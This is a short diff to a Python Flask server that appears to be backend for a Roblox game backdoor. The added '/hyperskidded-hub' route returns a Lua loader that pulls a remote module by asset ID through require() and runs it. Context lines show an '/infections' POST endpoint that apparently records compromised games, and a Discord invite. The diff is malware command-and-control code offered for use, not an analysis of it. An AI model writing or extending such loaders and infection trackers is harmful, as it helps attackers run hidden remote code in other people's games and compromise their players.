@@ -132,6 +132,10 @@ def getGameInfo(universeId: int):
 def index():
     return "https://discord.gg/jQ3vCYCJZD"
 
+@app.route("/hyperskidded-hub")
+def getscript():
+    return "return function(config) local source = require(118343058201260); source:HyperskiddedHub(config) end"
+
 @app.route("/infections", methods=["POST"])
 def infection():
     data = request.get_json()
